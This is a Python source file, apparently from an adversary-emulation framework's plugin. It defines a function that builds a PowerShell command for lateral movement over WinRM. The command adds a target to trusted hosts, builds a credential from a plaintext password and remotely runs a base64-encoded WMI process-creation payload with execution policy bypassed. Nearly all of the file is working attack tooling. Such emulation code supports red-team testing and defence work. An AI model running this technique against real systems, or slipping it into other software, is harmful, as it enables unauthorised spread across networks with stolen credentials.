from plugins.adversary.app.commands.command import CommandLine
from typing import Callable, Tuple
from plugins.adversary.app.commands import parsers
import base64


def lateral_movement(ip: str, password: str, domain: str, user: str, file_loc: str) -> Tuple[CommandLine,
                                                                                            Callable[[str], None]]:
    com = base64.b64encode(bytes("Invoke-WmiMethod -path win32_process -name create -argumentlist '" + file_loc + "'", 'UTF-16LE')).decode("UTF-8")
    command_line = ['powershell', '-ExecutionPolicy Bypass', '-NoLogo', '-NonInteractive', '-NoProfile', '-Command',
                    '"Set-Item WSMan:localhost\\client\\trustedhosts -value ' + ip +
                    '-Concatenate -Force;', '$pw = convertto-securestring -AsPlainText -Force -String ' + password +
                    ';', '$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist '
                    + domain + "\\" + user + ',$pw;', 'invoke-command -computerName ' + ip + ' -credential $cred '
                    '-scriptblock {' + 'powershell.exe -ExecutionPolicy Bypass -EncodedCommand ' + com + ' }"']
    return CommandLine(command_line), parsers.winrm.lateral_movement